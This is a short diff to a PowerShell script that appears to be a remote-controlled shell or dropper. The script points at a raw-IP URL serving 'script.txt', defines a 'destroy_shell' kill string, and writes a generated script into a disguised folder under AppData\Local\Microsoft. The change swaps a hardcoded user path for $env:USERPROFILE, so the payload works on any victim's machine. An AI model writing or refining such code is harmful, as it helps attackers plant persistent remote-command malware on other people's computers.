@@ -2,7 +2,7 @@ $verurl = 'http://31.5.63.215/script.txt'
 $stop = 'destroy_shell_7$456&89'
 $exec = 0
 
-if(!(Test-Path -Path "C:\Users\XZE3N\AppData\Local\Microsoft\hyp3r")) {mkdir "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r"}
+if(!(Test-Path -Path "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r")) {mkdir "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r"}
 $modulename = "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r\psscript.ps1"
 		Write-Output "`$verurl` = 'http://31.5.63.215/script.txt'" > $modulename
 		Write-Output "`$stop` = 'destroy_shell'" >> $modulename
